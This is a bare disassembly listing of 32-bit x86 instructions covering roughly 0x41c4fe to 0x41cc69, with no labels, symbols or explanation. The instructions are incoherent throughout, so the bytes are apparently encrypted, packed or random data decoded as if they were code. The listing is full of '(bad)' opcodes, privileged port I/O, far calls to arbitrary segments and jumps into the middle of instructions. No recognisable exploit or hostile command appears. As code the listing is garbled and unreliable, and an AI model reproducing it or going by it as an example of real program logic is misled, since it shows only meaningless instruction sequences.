  41c4fe:	adc    ebx,eax
  41c500:	xor    ch,cl
  41c502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c503:	push   esp
  41c504:	adc    BYTE PTR gs:[ebx-0x48b14af9],bl
  41c50b:	adc    eax,0xf2bb142e
  41c510:	and    DWORD PTR [eax+eax*2],eax
  41c513:	out    0x4c,eax
  41c515:	add    al,0x7b
  41c517:	xchg   ebx,eax
  41c518:	push   edx
  41c519:	inc    esi
  41c51a:	xlat   BYTE PTR ds:[ebx]
  41c51b:	pop    edx
  41c51c:	push   esp
  41c51d:	add    BYTE PTR [ebx+ebx*2-0x3cdba963],bh
  41c524:	mov    bl,0xb2
  41c526:	jo     0x41c4c7
  41c528:	mov    ah,0x47
  41c52a:	sar    edi,0xa
  41c52d:	pushf  
  41c52e:	test   al,0x39
  41c530:	dec    ebx
  41c531:	loopne 0x41c584
  41c533:	push   0xa550f27b
  41c538:	jne    0x41c4eb
  41c53a:	pop    ebx
  41c53b:	lods   eax,DWORD PTR ds:[esi]
  41c53c:	nop
  41c53d:	push   edx
  41c53e:	sub    esp,DWORD PTR [edi-0x7e]
  41c541:	rcr    BYTE PTR [ebx+0x33],cl
  41c544:	pop    ebx
  41c545:	sti    
  41c546:	adc    dh,0x65
  41c549:	cmp    BYTE PTR [eax-0x431ff675],bl
  41c54f:	fistp  QWORD PTR [edx+0x4fb29139]
  41c555:	push   ebp
  41c556:	addr16 es jmp 0x41c4f9
  41c55a:	retf   
  41c55b:	mov    esi,esp
  41c55d:	cs gs pop ecx
  41c560:	ins    DWORD PTR es:[edi],dx
  41c561:	lods   eax,DWORD PTR ds:[esi]
  41c562:	ja     0x41c573
  41c564:	dec    esp
  41c565:	not    edx
  41c567:	stc    
  41c568:	dec    ecx
  41c569:	dec    esi
  41c56a:	mov    ah,0x54
  41c56c:	fs mov ecx,0xdb92c1fb
  41c572:	mov    edi,0x16f6768c
  41c578:	retf   
  41c579:	das    
  41c57a:	(bad)  
  41c57b:	or     BYTE PTR [esi+ebx*8-0x72],bl
  41c57f:	jns    0x41c517
  41c581:	and    eax,0xdac333cb
  41c586:	rcl    BYTE PTR [edi+eiz*4+0x4b],cl
  41c58a:	clc    
  41c58b:	dec    eax
  41c58c:	inc    edx
  41c58d:	cs scas al,BYTE PTR es:[edi]
  41c58f:	jp     0x41c5fc
  41c591:	lahf   
  41c592:	dec    ebx
  41c593:	call   0x6ebc:0xdf3eb69c
  41c59a:	cmp    DWORD PTR [ebp-0x26bf408],0xffffffe8
  41c5a1:	xchg   DWORD PTR [ebx],esi
  41c5a3:	or     DWORD PTR [edx],0xffffffd7
  41c5a6:	(bad)  
  41c5a7:	mov    bh,0xa3
  41c5a9:	sbb    DWORD PTR [ebx-0x7b],0x4addb92d
  41c5b0:	adc    dl,BYTE PTR [ecx-0x76]
  41c5b3:	scas   al,BYTE PTR es:[edi]
  41c5b4:	leave  
  41c5b5:	inc    ebx
  41c5b6:	test   BYTE PTR [edx+0x242b4bb9],bh
  41c5bc:	inc    ebx
  41c5bd:	inc    esp
  41c5be:	or     ah,BYTE PTR [edi]
  41c5c0:	xchg   edi,eax
  41c5c1:	cmp    BYTE PTR [eax-0xe],0x70
  41c5c5:	popf   
  41c5c6:	cdq    
  41c5c7:	sbb    bl,BYTE PTR [ecx-0x13e46e1]
  41c5cd:	xor    ebp,DWORD PTR ds:0x8da657f8
  41c5d3:	xchg   bh,dl
  41c5d5:	mov    ebx,DWORD PTR ds:0xd12cbd10
  41c5db:	jg     0x41c565
  41c5dd:	fucom  st(4)
  41c5df:	jle    0x41c56c
  41c5e1:	lods   eax,DWORD PTR ds:[esi]
  41c5e2:	cmp    edx,ebp
  41c5e4:	jecxz  0x41c580
  41c5e6:	rol    BYTE PTR [edi+eiz*8+0x73d1e72d],0x8b
  41c5ee:	rcl    BYTE PTR [eax],0x6e
  41c5f1:	cmp    ebp,DWORD PTR [eax]
  41c5f3:	icebp  
  41c5f4:	mov    edx,0x5d02d1c
  41c5f9:	inc    esi
  41c5fa:	adc    al,0x72
  41c5fc:	and    esp,ebx
  41c5fe:	adc    eax,0x39ff4977
  41c603:	aaa    
  41c604:	in     al,dx
  41c605:	add    BYTE PTR [ecx],al
  41c607:	jne    0x41c664
  41c609:	stos   DWORD PTR es:[edi],eax
  41c60a:	sar    BYTE PTR [edi+0x12],1
  41c60d:	jp     0x41c5ea
  41c60f:	popf   
  41c610:	aaa    
  41c611:	scas   al,BYTE PTR es:[edi]
  41c612:	out    dx,eax
  41c613:	add    al,0x9e
  41c615:	xchg   esi,eax
  41c616:	les    esp,FWORD PTR ds:0xa1004611
  41c61c:	shl    DWORD PTR [esi+0x28],cl
  41c61f:	push   cs
  41c620:	cld    
  41c621:	jnp    0x41c5cc
  41c623:	loopne 0x41c629
  41c625:	pop    es
  41c626:	inc    ebx
  41c627:	mov    WORD PTR [eax+edx*2-0x33f688cb],ds
  41c62e:	cld    
  41c62f:	cmc    
  41c630:	out    0x8a,eax
  41c632:	fisubr DWORD PTR [ecx+0x778ec0a3]
  41c638:	lods   eax,DWORD PTR ds:[esi]
  41c639:	adc    BYTE PTR [ebp-0x16057505],bh
  41c63f:	sti    
  41c640:	retf   0x751b
  41c643:	cmp    dl,BYTE PTR [edx]
  41c645:	jmp    0xa403:0xd023a382
  41c64c:	jbe    0x41c663
  41c64e:	int    0xbe
  41c650:	pop    edi
  41c651:	adc    cl,ch
  41c653:	sbb    BYTE PTR [ecx],cl
  41c655:	add    dl,BYTE PTR [ebx]
  41c657:	xlat   BYTE PTR ds:[ebx]
  41c658:	and    DWORD PTR ds:0x37925d37,ebp
  41c65e:	or     bl,BYTE PTR [edx]
  41c660:	retf   0xd514
  41c663:	inc    esi
  41c664:	daa    
  41c665:	bound  esi,QWORD PTR [eax+0x1bebeece]
  41c66b:	shr    DWORD PTR [esi],0x80
  41c66e:	inc    BYTE PTR [ebp+0x6410d8d3]
  41c674:	jp     0x41c6d1
  41c676:	jb     0x41c601
  41c678:	sbb    BYTE PTR [ecx],bh
  41c67a:	arpl   WORD PTR [ecx+0x5d908bce],bx
  41c680:	mov    cl,0x50
  41c682:	mov    bl,0x5f
  41c684:	outs   dx,DWORD PTR ds:[esi]
  41c685:	jnp    0x41c648
  41c687:	pop    ebx
  41c688:	imul   ebx,DWORD PTR [edx+esi*1+0x39],0x9014bad0
  41c690:	sbb    DWORD PTR [esi-0x7dd0714b],ebx
  41c696:	(bad)  
  41c697:	call   0x7d040810
  41c69c:	fstp   QWORD PTR [edx-0x167000dc]
  41c6a2:	fld    QWORD PTR [esi+edi*8]
  41c6a5:	xor    dl,0xb6
  41c6a8:	dec    eax
  41c6a9:	out    0xe5,al
  41c6ab:	es pushf 
  41c6ad:	adc    al,BYTE PTR [esp+esi*4-0x44]
  41c6b1:	js     0x41c6ff
  41c6b3:	cld    
  41c6b4:	sbb    eax,0x3ceae5a3
  41c6b9:	and    DWORD PTR [ebp+0x54],ebp
  41c6bc:	out    0x3,al
  41c6be:	xor    DWORD PTR [edi-0x68c7794d],ebx
  41c6c4:	arpl   WORD PTR [ebp+eax*1+0x57cff2b1],di
  41c6cb:	mov    fs,WORD PTR [ebx]
  41c6cd:	bnd jge 0x41c6ea
  41c6d0:	sub    ebx,edx
  41c6d2:	jle    0x41c6d3
  41c6d4:	(bad)  
  41c6d6:	xchg   bh,bl
  41c6d8:	and    al,BYTE PTR [esi-0x1e98af23]
  41c6de:	sbb    bh,dl
  41c6e0:	and    BYTE PTR [edi],cl
  41c6e2:	xlat   BYTE PTR ds:[ebx]
  41c6e3:	idiv   bl
  41c6e5:	aas    
  41c6e6:	xchg   esi,eax
  41c6e7:	shl    DWORD PTR [edx+ecx*1],cl
  41c6ea:	out    0xf2,eax
  41c6ec:	sbb    eax,0xd47af567
  41c6f1:	outs   dx,DWORD PTR ds:[esi]
  41c6f2:	nop
  41c6f3:	mov    esi,DWORD PTR [ecx+eiz*1]
  41c6f6:	cwde   
  41c6f7:	jecxz  0x41c6fc
  41c6f9:	add    dh,dh
  41c6fb:	add    al,ch
  41c6fd:	xlat   BYTE PTR ds:[ebx]
  41c6fe:	cwde   
  41c6ff:	fiadd  WORD PTR [edi+esi*1-0x61]
  41c703:	rcr    bl,1
  41c705:	sar    BYTE PTR [ebx],0xb8
  41c708:	mov    dl,0x96
  41c70a:	fdiv   st,st(3)
  41c70c:	push   ebp
  41c70d:	lods   al,BYTE PTR ds:[esi]
  41c70e:	(bad)  
  41c70f:	cmp    DWORD PTR [ebp+0x11490618],ecx
  41c715:	push   ds
  41c716:	rsqrtps xmm7,XMMWORD PTR [edi+0x435ed621]
  41c71d:	dec    ebp
  41c71e:	neg    DWORD PTR [ebp+eiz*1-0x11]
  41c722:	sbb    DWORD PTR [esi-0xbb9c94c],eax
  41c728:	ret    0xbe29
  41c72b:	das    
  41c72c:	xchg   ecx,eax
  41c72d:	push   esi
  41c72e:	push   es
  41c72f:	jmp    0xc8608681
  41c734:	fcom   st(5)
  41c736:	and    edx,DWORD PTR [ebp-0x54769a74]
  41c73c:	mov    ecx,0xe2aca5c3
  41c741:	mov    bh,0x93
  41c743:	or     eax,0xdc1b4c74
  41c748:	jmp    DWORD PTR [ebp+0x60]
  41c74b:	push   esi
  41c74c:	shr    DWORD PTR [ecx-0x91bdc00],1
  41c752:	test   BYTE PTR [esi],0xa1
  41c755:	fisttp WORD PTR [eiz*2-0x44a770e3]
  41c75c:	enter  0x8ff9,0x7f
  41c760:	int3   
  41c761:	enter  0xb79e,0xf1
  41c765:	or     esi,esi
  41c767:	or     bl,al
  41c769:	and    eax,0x13946bf4
  41c76e:	pop    esp
  41c76f:	dec    eax
  41c770:	or     al,0xc8
  41c772:	call   0x251b:0x7ac1b7c9
  41c779:	mov    al,ds:0xa9a2e639
  41c77e:	arpl   WORD PTR [ebx],bx
  41c780:	cmp    al,0x5c
  41c782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c783:	mov    WORD PTR [ebx+0x12e5ce5],ss
  41c789:	out    dx,eax
  41c78a:	or     BYTE PTR [esp+ecx*4-0x67c4e60],0xa3
  41c792:	dec    edi
  41c793:	xchg   ecx,eax
  41c794:	scas   al,BYTE PTR es:[edi]
  41c795:	retf   0x517c
  41c798:	add    eax,DWORD PTR [edi]
  41c79a:	mov    al,ds:0x8273dbca
  41c79f:	dec    ebp
  41c7a0:	rol    DWORD PTR [edi],cl
  41c7a2:	jl     0x41c7a2
  41c7a4:	cmp    DWORD PTR cs:[esi+ebx*1+0x5f],ebx
  41c7a9:	push   edx
  41c7aa:	(bad)  
  41c7ab:	lock shl BYTE PTR [eax-0x3a],1
  41c7af:	push   ss
  41c7b0:	mov    ebx,0x117af102
  41c7b5:	out    0x6f,eax
  41c7b7:	mov    ecx,0x97f571e7
  41c7bc:	pop    ss
  41c7bd:	aas    
  41c7be:	jns    0x41c7bc
  41c7c0:	repz or eax,ecx
  41c7c3:	jo     0x41c758
  41c7c5:	add    ah,BYTE PTR [edi]
  41c7c7:	and    DWORD PTR [edx],edx
  41c7c9:	out    dx,eax
  41c7ca:	mov    edx,0x27c70a9
  41c7cf:	mov    DWORD PTR [ebx],esi
  41c7d1:	cs or  ebx,esi
  41c7d4:	fs int 0x92
  41c7d7:	out    0xb6,eax
  41c7d9:	nop
  41c7da:	dec    esi
  41c7db:	test   al,0x77
  41c7dd:	xor    dl,BYTE PTR [ebp+edi*1+0x31]
  41c7e1:	lock fiadd DWORD PTR [edx+0xa]
  41c7e5:	xchg   edx,eax
  41c7e6:	into   
  41c7e7:	xor    ah,cl
  41c7e9:	cmp    dh,BYTE PTR [esi-0x28]
  41c7ec:	lahf   
  41c7ed:	xor    BYTE PTR [eax*4-0x634e230],cl
  41c7f4:	ja     0x41c7cb
  41c7f6:	dec    edi
  41c7f7:	jbe    0x41c860
  41c7f9:	mov    al,0xcd
  41c7fb:	adc    eax,0x6ca87424
  41c800:	push   ebx
  41c801:	je     0x41c7c3
  41c803:	pop    esp
  41c804:	mov    edx,0x5e898007
  41c809:	jo     0x41c798
  41c80b:	ret    
  41c80c:	pop    edi
  41c80d:	jno    0x41c7f2
  41c80f:	cs cmp al,0x1e
  41c812:	add    eax,ebp
  41c814:	les    edi,FWORD PTR cs:[ebx+esi*4-0x50]
  41c819:	jne    0x41c885
  41c81b:	push   eax
  41c81c:	call   0x3eca:0x5c9c0964
  41c823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c824:	push   edi
  41c825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c826:	in     eax,0xb9
  41c828:	rcr    BYTE PTR [ebx-0x5f720ce2],0x42
  41c82f:	push   ss
  41c830:	sub    bl,BYTE PTR [edi+0x6c]
  41c833:	scas   eax,DWORD PTR es:[edi]
  41c834:	lea    esi,[edx+0x661620f2]
  41c83a:	stos   DWORD PTR es:[edi],eax
  41c83b:	add    bh,dh
  41c83d:	bound  esp,QWORD PTR [ebx]
  41c83f:	jecxz  0x41c83a
  41c841:	into   
  41c842:	push   esi
  41c843:	(bad)  
  41c844:	jmp    0x2d1c1d8c
  41c849:	mov    al,ds:0xefb00af9
  41c84e:	es pop edi
  41c850:	pusha  
  41c851:	out    0x61,eax
  41c853:	nop
  41c854:	and    esi,DWORD PTR [edx+0x75926733]
  41c85a:	adc    bl,bl
  41c85c:	stos   BYTE PTR es:[edi],al
  41c85d:	mov    ebp,0xf5c5b2d3
  41c862:	test   DWORD PTR [ecx+ebp*1],ecx
  41c865:	imul   edx,ecx,0x3f4c08ff
  41c86b:	(bad)  
  41c86c:	test   eax,0xffad95cc
  41c871:	cmp    ch,BYTE PTR [edi+0x2e47472e]
  41c877:	fist   WORD PTR [ebx+0x39]
  41c87a:	icebp  
  41c87b:	scas   al,BYTE PTR es:[edi]
  41c87c:	adc    ecx,DWORD PTR [esi]
  41c87e:	sbb    eax,0x298aec4e
  41c883:	xlat   BYTE PTR ds:[ebx]
  41c884:	sti    
  41c885:	and    BYTE PTR [ebp+0x6c2cde7a],al
  41c88b:	shr    BYTE PTR [esi+eax*4],1
  41c88e:	or     esp,esi
  41c890:	adc    eax,0x4c0301e2
  41c895:	mov    BYTE PTR [edx-0x18],ah
  41c898:	or     eax,0xb40aaf72
  41c89d:	std    
  41c89e:	jp     0x41c870
  41c8a0:	loopne 0x41c8df
  41c8a2:	cdq    
  41c8a3:	out    0x38,al
  41c8a5:	test   DWORD PTR [ecx+0x6e],esi
  41c8a8:	outs   dx,DWORD PTR ds:[esi]
  41c8a9:	jnp    0x41c871
  41c8ab:	std    
  41c8ac:	sbb    al,cl
  41c8ae:	loop   0x41c8f1
  41c8b0:	xchg   ebp,eax
  41c8b1:	sub    esp,ecx
  41c8b3:	mov    ecx,0xda24380a
  41c8b8:	fucom  st(3)
  41c8ba:	and    eax,0xa54fa42e
  41c8bf:	scas   al,BYTE PTR es:[edi]
  41c8c0:	stos   DWORD PTR es:[edi],eax
  41c8c1:	pop    ecx
  41c8c2:	out    0xf5,eax
  41c8c4:	sbb    bl,BYTE PTR [ebx]
  41c8c6:	lods   al,BYTE PTR ds:[esi]
  41c8c7:	mov    esp,0x2a2e1bba
  41c8cc:	xor    BYTE PTR [edi+0xb],ah
  41c8cf:	popf   
  41c8d0:	inc    edi
  41c8d1:	fidivr WORD PTR [ebp-0x7c]
  41c8d4:	mov    esi,0xe45e2169
  41c8d9:	dec    ebx
  41c8da:	dec    ebx
  41c8db:	call   0x730a:0xf2dc25bd
  41c8e2:	bound  ebp,QWORD PTR [edi]
  41c8e4:	jle    0x41c94c
  41c8e6:	(bad)  
  41c8e7:	and    eax,0xa3feade1
  41c8ec:	mov    BYTE PTR [ebx],ah
  41c8ee:	mov    WORD PTR [edx+0x78],fs
  41c8f1:	push   esi
  41c8f2:	mov    cl,0x9a
  41c8f4:	loopne 0x41c8de
  41c8f6:	mov    ds:0x60380da3,eax
  41c8fb:	outs   dx,DWORD PTR ds:[esi]
  41c8fc:	mov    gs,WORD PTR [ebp-0x5c343631]
  41c902:	lds    esi,FWORD PTR [ebx+esi*1]
  41c905:	repz rcl DWORD PTR [esi+0xc],cl
  41c909:	fwait
  41c90a:	ja     0x41c8ed
  41c90c:	jbe    0x41c971
  41c90e:	push   0x7c
  41c910:	mov    dh,0x1b
  41c912:	add    BYTE PTR [esi-0x23],dh
  41c915:	jmp    0x9fc:0x6889f14a
  41c91c:	cmp    DWORD PTR [ecx+0x61e20fbd],edx
  41c922:	mov    edx,DWORD PTR [edx+0x7061bcb7]
  41c928:	(bad)  
  41c929:	fist   DWORD PTR [ecx+ebx*8-0x35]
  41c92d:	mov    cl,0x6e
  41c92f:	xor    BYTE PTR [ebp+0x51],0x9e
  41c933:	jmp    0x44a2e5c
  41c938:	push   edx
  41c939:	ficomp DWORD PTR [edx-0x33b8bdc2]
  41c93f:	out    dx,eax
  41c940:	cmp    BYTE PTR [eax],ch
  41c942:	stc    
  41c943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c944:	push   edi
  41c945:	pushf  
  41c946:	pop    ds
  41c947:	retf   
  41c948:	mov    ch,0x2
  41c94a:	jnp    0x41c903
  41c94c:	mov    ah,0xcb
  41c94e:	push   ecx
  41c94f:	enter  0x49c7,0xb2
  41c953:	stos   DWORD PTR es:[edi],eax
  41c954:	in     eax,0x62
  41c956:	mov    al,ds:0x8fc22886
  41c95c:	mov    al,ds:0xaa64305c
  41c961:	jns    0x41c9a9
  41c963:	call   0xf6e8864f
  41c968:	sbb    BYTE PTR [eax],bh
  41c96a:	ror    ebx,cl
  41c96c:	push   ecx
  41c96d:	dec    ebp
  41c96e:	ret    0xcc2a
  41c971:	xor    al,0x6
  41c973:	pop    edi
  41c974:	pop    ds
  41c975:	fwait
  41c976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c977:	dec    edi
  41c978:	mul    BYTE PTR [esi-0x11]
  41c97b:	popf   
  41c97c:	jmp    0x8a9d:0x935ca00f
  41c983:	mov    ecx,0x44b671cb
  41c989:	pop    ds
  41c98a:	cmp    al,0xb3
  41c98c:	fwait
  41c98d:	sbb    eax,0x9ca33b78
  41c992:	test   al,0x20
  41c994:	(bad)  
  41c995:	test   BYTE PTR [esi+0x2a],ch
  41c998:	push   edx
  41c999:	in     eax,dx
  41c99a:	xor    BYTE PTR [ecx+0x3371cba9],0xa2
  41c9a1:	rcr    DWORD PTR [ecx+0x76],cl
  41c9a4:	icebp  
  41c9a5:	cmp    al,0x35
  41c9a7:	int    0xbe
  41c9a9:	cmc    
  41c9aa:	sahf   
  41c9ab:	jge    0x41c96c
  41c9ad:	pop    ebx
  41c9ae:	push   esp
  41c9af:	(bad)  
  41c9b0:	lods   al,BYTE PTR cs:[esi]
  41c9b2:	imul   esp,DWORD PTR [ebp-0x18],0x7b3c165a
  41c9b9:	ror    BYTE PTR [esi-0x372a8c83],cl
  41c9bf:	ins    DWORD PTR es:[edi],dx
  41c9c0:	pop    eax
  41c9c1:	pop    ds
  41c9c2:	and    ch,0xce
  41c9c5:	jg     0x41ca46
  41c9c7:	mov    BYTE PTR [ebx],0xe5
  41c9ca:	adc    dl,ch
  41c9cc:	xchg   dl,bl
  41c9ce:	loopne 0x41c964
  41c9d0:	gs pop ebx
  41c9d2:	fidiv  DWORD PTR [esi+0x5e]
  41c9d5:	mov    dh,0x38
  41c9d7:	ja     0x41ca54
  41c9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9da:	xor    ebx,DWORD PTR [eax]
  41c9dc:	cld    
  41c9dd:	sar    BYTE PTR [esi+0x71e73e72],1
  41c9e3:	push   ebp
  41c9e4:	add    al,0x10
  41c9e6:	lock out dx,al
  41c9e8:	inc    eax
  41c9e9:	sub    eax,0x83cd9768
  41c9ee:	xchg   ebx,eax
  41c9ef:	jmp    0x41ca6d
  41c9f1:	outs   dx,WORD PTR ds:[esi]
  41c9f3:	jge    0x41c9d6
  41c9f5:	push   esp
  41c9f6:	(bad)  
  41c9f8:	sbb    bh,al
  41c9fa:	dec    ecx
  41c9fb:	add    eax,0xc769a04f
  41ca00:	add    DWORD PTR [ecx*2+0xb6e6866],esp
  41ca07:	dec    eax
  41ca08:	test   cl,al
  41ca0a:	fcomp  DWORD PTR [edi]
  41ca0c:	and    eax,DWORD PTR [eax+0x19]
  41ca0f:	mov    al,ds:0x243264b5
  41ca14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca15:	jae    0x41c9c7
  41ca17:	cmp    bh,BYTE PTR [edx+0x2fd6eea1]
  41ca1d:	(bad)  [edi-0x2b]
  41ca20:	mov    al,0xdd
  41ca22:	test   BYTE PTR [ecx],bh
  41ca24:	add    ch,dl
  41ca26:	retf   
  41ca27:	or     bh,BYTE PTR [eax]
  41ca29:	imul   eax,DWORD PTR [esi],0xcb49abf6
  41ca2f:	cdq    
  41ca30:	inc    ebp
  41ca31:	loop   0x41ca9e
  41ca33:	jp     0x41ca12
  41ca35:	xchg   esp,eax
  41ca36:	je     0x41ca13
  41ca38:	jge    0x41ca45
  41ca3a:	lock or DWORD PTR [edx],0x22
  41ca3e:	and    eax,0x32ade26c
  41ca43:	push   edx
  41ca44:	mov    edx,0xc230b600
  41ca49:	add    bl,BYTE PTR [esp+ebx*1-0x4a4f7097]
  41ca50:	xchg   edi,eax
  41ca51:	pop    ebp
  41ca52:	addr16 sub eax,eax
  41ca55:	and    ebp,DWORD PTR [edi-0x69d88aa1]
  41ca5b:	cs jae 0x41ca79
  41ca5e:	sub    BYTE PTR [esi+ebp*2],0xc8
  41ca62:	push   esi
  41ca63:	repnz stos DWORD PTR es:[edi],eax
  41ca65:	sbb    edx,DWORD PTR [ebp-0x61100e0d]
  41ca6b:	sbb    ch,BYTE PTR [ebp+edx*8-0x7a]
  41ca6f:	pushf  
  41ca70:	data16 std 
  41ca72:	pop    esi
  41ca73:	fcomp  DWORD PTR [ebx-0x543e7ad8]
  41ca79:	aas    
  41ca7a:	iret   
  41ca7b:	pop    edi
  41ca7c:	push   ebx
  41ca7d:	add    BYTE PTR [ecx],al
  41ca7f:	inc    edi
  41ca80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca81:	inc    ecx
  41ca82:	sub    ebx,esp
  41ca84:	rol    DWORD PTR [ecx-0x5b812918],0xc7
  41ca8b:	push   edx
  41ca8c:	sub    eax,0x1f9a994f
  41ca91:	xchg   esi,eax
  41ca92:	adc    eax,0x8522acd8
  41ca97:	mov    dl,0xb5
  41ca99:	imul   esp,DWORD PTR [ecx+ecx*8-0x500b3f04],0x23
  41caa1:	xor    al,0xc0
  41caa3:	jns    0x41ca3b
  41caa5:	mul    DWORD PTR [esi]
  41caa7:	imul   esi,DWORD PTR [esi+0x19151512],0x1
  41caae:	jbe    0x41cacd
  41cab0:	and    DWORD PTR [ebp-0x35],0x5370989f
  41cab7:	loope  0x41ca3f
  41cab9:	call   0x8d36:0x59ba2ea1
  41cac0:	xor    ch,BYTE PTR [ebx]
  41cac2:	xchg   ebx,eax
  41cac3:	jge    0x41caf1
  41cac5:	pop    ds
  41cac6:	inc    esi
  41cac7:	jno    0x41ca5f
  41cac9:	inc    edi
  41caca:	dec    ebp
  41cacb:	adc    eax,0x97518801
  41cad0:	pop    esp
  41cad1:	jg     0x41ca8a
  41cad3:	or     ah,bl
  41cad5:	sti    
  41cad6:	adc    DWORD PTR [edx+0x1c7f78cd],0x75
  41cadd:	or     edi,eax
  41cadf:	cld    
  41cae0:	test   BYTE PTR [edi-0x51ba529],al
  41cae6:	out    0x94,eax
  41cae8:	pop    esi
  41cae9:	nop
  41caea:	add    ecx,DWORD PTR [ebp-0xb60911b]
  41caf0:	arpl   WORD PTR ds:0x257b62af,bp
  41caf6:	push   edi
  41caf7:	pushf  
  41caf8:	sub    bh,BYTE PTR [eax-0x598bdc47]
  41cafe:	scas   eax,DWORD PTR es:[edi]
  41caff:	xchg   edx,eax
  41cb00:	call   DWORD PTR [ebx-0x207b4187]
  41cb06:	sahf   
  41cb07:	in     al,dx
  41cb08:	shl    DWORD PTR [eax+0x2919c594],cl
  41cb0e:	add    ebp,DWORD PTR [edi]
  41cb10:	mov    dh,0x62
  41cb12:	inc    esi
  41cb13:	cli    
  41cb14:	mov    ds:0xee00e44a,al
  41cb19:	push   ss
  41cb1a:	push   cs
  41cb1b:	call   0x7b13:0x7243b57b
  41cb22:	bound  edx,QWORD PTR [edi]
  41cb24:	ins    BYTE PTR es:[edi],dx
  41cb25:	mov    ah,0x81
  41cb27:	daa    
  41cb28:	ja     0x41caf0
  41cb2a:	(bad)  
  41cb2b:	and    BYTE PTR [esi+0x760daa8d],bh
  41cb31:	mov    edi,0x4d1ec421
  41cb36:	inc    eax
  41cb37:	inc    ecx
  41cb38:	das    
  41cb39:	mov    ah,0x7b
  41cb3b:	mov    DWORD PTR [edi-0x74],ebp
  41cb3e:	jno    0x41cb40
  41cb40:	loope  0x41cb88
  41cb42:	or     BYTE PTR [ebx],0x54
  41cb45:	js     0x41cb4c
  41cb47:	scas   ax,WORD PTR es:[edi]
  41cb49:	popa   
  41cb4a:	pusha  
  41cb4b:	mov    dh,0x48
  41cb4d:	or     DWORD PTR [edx+ecx*8+0x74cc6f5f],edx
  41cb54:	aad    0x11
  41cb56:	(bad)  [ebx+0x3726c5c9]
  41cb5c:	xlat   BYTE PTR ds:[ebx]
  41cb5d:	fwait
  41cb5e:	pop    ebp
  41cb5f:	mov    edi,0xd07b01d6
  41cb64:	out    0x8,al
  41cb66:	xchg   edi,eax
  41cb67:	scas   al,BYTE PTR es:[edi]
  41cb68:	or     al,0x97
  41cb6a:	mov    bh,0xb2
  41cb6c:	mov    ch,0x1c
  41cb6e:	rol    BYTE PTR [eax+0x3ad96e24],0xe9
  41cb75:	in     al,dx
  41cb76:	xor    BYTE PTR [ebx-0x13346e90],0xfd
  41cb7d:	xchg   ebp,eax
  41cb7e:	test   eax,0x2953d7f7
  41cb83:	ss inc ecx
  41cb85:	pop    eax
  41cb86:	and    DWORD PTR [ebp-0x678cb8a6],ebp
  41cb8c:	arpl   WORD PTR [edx-0x12be7464],dx
  41cb92:	shr    esp,1
  41cb94:	addr16 gs jb 0x41cb70
  41cb98:	adc    eax,0x158073c2
  41cb9d:	xchg   edi,eax
  41cb9e:	xor    DWORD PTR [eax-0x26],esp
  41cba1:	retf   0xbc19
  41cba4:	mov    esi,0xc8818e6
  41cba9:	fimul  WORD PTR [ebx+0x1b238eec]
  41cbaf:	loop   0x41cb5c
  41cbb1:	fldcw  WORD PTR ss:[ebx+0x6a]
  41cbb5:	mov    WORD PTR [ebx+0x19d5233a],?
  41cbbb:	rcr    WORD PTR [eax+0x46195006],cl
  41cbc2:	mov    si,0x194
  41cbc6:	sbb    DWORD PTR [ebp+0x28],0xadfe359c
  41cbcd:	into   
  41cbce:	mov    bl,0x60
  41cbd0:	adc    BYTE PTR [edi],dl
  41cbd2:	push   edi
  41cbd3:	(bad)  
  41cbd4:	cmc    
  41cbd5:	add    ecx,DWORD PTR [esi-0x34130758]
  41cbdb:	sub    edi,DWORD PTR [edx+ecx*2]
  41cbde:	adc    edx,DWORD PTR [esi+0x4f]
  41cbe1:	test   al,0xab
  41cbe3:	or     esi,DWORD PTR [ecx]
  41cbe5:	dec    ebp
  41cbe6:	ret    
  41cbe7:	push   0x17a6475f
  41cbec:	cmp    ah,BYTE PTR [ebp+0x13]
  41cbef:	cmp    esi,ecx
  41cbf1:	and    dh,dl
  41cbf3:	xchg   esi,eax
  41cbf4:	xchg   edx,edi
  41cbf6:	sbb    esp,DWORD PTR [edi-0x10]
  41cbf9:	jecxz  0x41cbab
  41cbfb:	int    0x21
  41cbfd:	jecxz  0x41cbdb
  41cbff:	pushf  
  41cc00:	pop    ebx
  41cc01:	loop   0x41cc4d
  41cc03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc04:	ins    BYTE PTR es:[edi],dx
  41cc05:	jg     0x41cc0a
  41cc07:	mul    ebx
  41cc09:	sub    cl,cl
  41cc0b:	inc    ebp
  41cc0c:	mov    edi,0x1f7432f1
  41cc11:	sub    al,0xdd
  41cc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc14:	push   edx
  41cc15:	bound  ecx,QWORD PTR [ecx]
  41cc17:	fisttp QWORD PTR [esi]
  41cc19:	lods   eax,DWORD PTR ds:[esi]
  41cc1a:	jle    0x41cc0d
  41cc1c:	adc    al,0x30
  41cc1e:	call   0x4f634060
  41cc23:	aaa    
  41cc24:	aad    0x89
  41cc26:	jmp    0x6896:0x629838e3
  41cc2d:	push   ecx
  41cc2e:	pop    eax
  41cc2f:	pusha  
  41cc30:	xchg   ebx,eax
  41cc31:	in     al,dx
  41cc32:	jo     0x41cc39
  41cc34:	pop    es
  41cc35:	pop    edi
  41cc36:	sbb    eax,0x21988f07
  41cc3b:	rol    BYTE PTR [edx-0x21bcf495],1
  41cc41:	retf   
  41cc42:	(bad)  
  41cc44:	mov    ch,0x8d
  41cc46:	fs xchg esi,eax
  41cc48:	mov    bh,0xe3
  41cc4a:	lods   eax,DWORD PTR ds:[esi]
  41cc4b:	add    BYTE PTR [ebx+0x61],ch
  41cc4e:	outs   dx,BYTE PTR ds:[esi]
  41cc4f:	rol    BYTE PTR [edx],cl
  41cc51:	idiv   BYTE PTR [edx-0x7e25e87a]
  41cc57:	(bad)  
  41cc58:	sbb    dl,BYTE PTR [ebp-0x283b50c8]
  41cc5e:	and    eax,0x20aff4f7
  41cc63:	inc    esi
  41cc64:	out    0xfa,al
  41cc66:	add    ch,BYTE PTR [esi+0x3f]
  41cc69:	rcr    BYTE PTR [edx+0x48],cl
